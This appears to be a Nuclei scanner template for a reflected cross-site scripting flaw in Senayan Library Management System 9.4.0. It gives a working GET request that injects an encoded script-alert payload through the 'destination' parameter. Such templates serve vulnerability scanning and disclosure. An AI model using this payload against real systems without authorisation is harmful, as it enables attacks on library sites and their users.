# Nuclei Template: Senayan Library Management System v9.4.0(SLIMS 9) - Cross Site Scripting
**Template ID:** slims-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`slims-xss.yaml`)

## Vulnerability Information & PoC

## Description
SLIMS 9 was discovered to contain `destination` request parameter that copies the value of an HTML tag attribute which is encapsulated in double quotation marks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member
```

## References
- https://packetstormsecurity.com/files/170182/Senayan-Library-Management-System-9.4.0-Cross-Site-Scripting.html
